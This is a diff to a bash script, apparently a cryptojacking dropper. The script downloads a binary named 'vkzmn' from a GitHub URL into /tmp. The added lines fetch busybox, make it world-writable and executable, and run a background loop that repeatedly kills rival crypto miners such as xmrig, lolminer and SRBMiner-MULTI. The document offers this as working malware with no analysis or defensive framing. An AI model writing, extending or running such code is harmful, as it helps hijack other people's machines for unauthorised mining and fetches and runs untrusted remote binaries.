@@ -2,8 +2,8 @@
 
 
 url='https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn'
+killall='https://busybox.net/downloads/binaries/1.16.1/busybox-x86_64'
 
-my_bin='vkzmn'
 
 
 
@@ -39,12 +39,20 @@ else
 echo  wget encontrado
 
 
+wget $killall  -O /tmp/busybox  #download of busybox  to use killall to kill  miners process
+
+chmod 777 /tmp/busybox
+
+
 wget $url -O /tmp/vkzmn
+
+
 
 
 fi;
 
 }
+
 
 
 
@@ -211,9 +219,8 @@ fi;
 }
 
 
-
-
 init() {
+
 while  true ; do
 
 sleep  1
@@ -225,9 +232,35 @@ done
 
 
 
+my_killall(){
 
 
- init
+while true ; do
+
+
+
+/tmp/./busybox  killall  xmrig xmrig1 xmrig2 lolminer bzminer SRBMiner-MULTI nokillme
+
+sleep  5
+
+done
+
+}
+
+
+my_killall &
+
+ 
+init 
+
+
+
+
+
+
+
+
+
 
 
 
